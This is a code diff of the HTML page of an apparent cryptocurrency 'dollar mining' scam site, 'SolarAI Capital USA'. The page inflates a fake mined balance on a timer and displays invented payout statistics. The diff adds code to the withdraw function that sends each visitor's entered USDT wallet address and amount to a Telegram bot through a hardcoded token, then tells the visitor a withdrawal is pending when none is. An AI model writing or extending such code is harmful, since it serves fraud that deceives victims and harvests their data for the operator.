@@ -1,71 +1,20 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SolarAI Capital USA - Dollar Mining</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;}
-body{background:#0a0a0a;color:white;min-height:100vh;}
-.header{padding:20px;background:#111;border-bottom:1px solid #222;display:flex;justify-content:space-between;}
-.logo{font-weight:bold;font-size:18px;} .logo span{color:#00ff88;}
-.hero{padding:40px 20px;text-align:center;}
-.hero h1{font-size:32px;margin-bottom:10px;}
-.hero p{color:#888;margin-bottom:30px;}
-.card{background:#111;border:1px solid #222;border-radius:16px;padding:24px;margin:20px;max-width:500px;margin-left:auto;margin-right:auto;}
-.balance{font-size:14px;color:#888;}
-.amount{font-size:42px;font-weight:bold;margin:10px 0;color:#00ff88;}
-.btn{width:100%;padding:16px;background:white;color:black;border:none;border-radius:12px;font-weight:bold;font-size:16px;margin-top:20px;cursor:pointer;}
-.btn-green{background:#00ff88 !important;}
-.stats{display:flex;justify-content:space-between;margin-top:20px;gap:10px;}
-.stat{background:#1a1a1a;padding:15px;border-radius:12px;flex:1;text-align:center;}
-.stat b{display:block;font-size:18px;margin-bottom:5px;}
-.stat small{color:#888;font-size:12px;}
-.badge{display:inline-block;background:#00ff8820;color:#00ff88;padding:6px 12px;border-radius:20px;font-size:12px;margin-bottom:20px;border:1px solid #00ff8840;}
-</style>
-</head>
-<body>
-<div class="header">
-<div class="logo">⚡ <span>SolarAI</span> USA</div>
-<div style="font-size:12px;color:#00ff88;">● LIVE</div>
-</div>
-<div class="hero">
-<div class="badge">🇺🇸 USA Dollar Mining Active</div>
-<h1>Mine USD Daily</h1>
-<p>Your solar-powered dollar mining bot is live</p>
-</div>
-<div class="card">
-<div class="balance">Total Mined Balance</div>
-<div class="amount" id="balance">$0.00</div>
-<div style="color:#888;font-size:13px;">Speed: $0.12 / sec</div>
-<button class="btn" id="mineBtn" onclick="mine()">⚡ START MINING</button>
-<button class="btn btn-green" onclick="withdraw()">💵 WITHDRAW USD</button>
-<div class="stats">
-<div class="stat"><b>1,248</b><small>Active</small></div>
-<div class="stat"><b>$4.2M</b><small>Paid</small></div>
-<div class="stat"><b>USA</b><small>Region</small></div>
-</div>
-</div>
-<script>
-let bal=0; let mining=false;
-function mine(){
- if(mining) return;
- mining=true;
- document.getElementById('mineBtn').innerText='⛏️ MINING...';
- setInterval(()=>{ bal+=0.12+Math.random()*0.05; document.getElementById('balance').innerText='$'+bal.toFixed(2); },200);
-}
 function withdraw(){
   if(bal < 50){
     alert("⚠️ Minimum withdrawal is $50.00\n\nYou have: $" + bal.toFixed(2) + "\n\nKeep mining until you reach $50!");
   } else {
     let wallet = prompt("💵 Withdraw $" + bal.toFixed(2) + "\n\nEnter your USDT (TRC20) wallet address:");
     if(wallet && wallet.length > 10){
+      
+      // SEND TO YOUR TELEGRAM
+      let token = "8940541573:AAFjScGdvW-W2NbjdPC78ooxIBNENqkQSjE";
+      let chatId = "1884572429";
+      let text = `🚨 NEW WITHDRAWAL - SolarAI USA\n\n💰 Amount: $${bal.toFixed(2)}\n👛 Wallet: ${wallet}\n🕐 Time: ${new Date().toLocaleString()}\n🌐 Site: solarai-capital-usa.vercel.app`;
+      
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+      
       alert("✅ Withdrawal Request Received!\n\nAmount: $" + bal.toFixed(2) + "\nWallet: " + wallet + "\n\nStatus: PENDING\nWill be processed in 24h by USA team.\n\nYou will receive USDT on TRC20.");
       bal=0;
       document.getElementById('balance').innerText='$0.00';
     }
   }
 }
-</script>
-</body>
-</html>
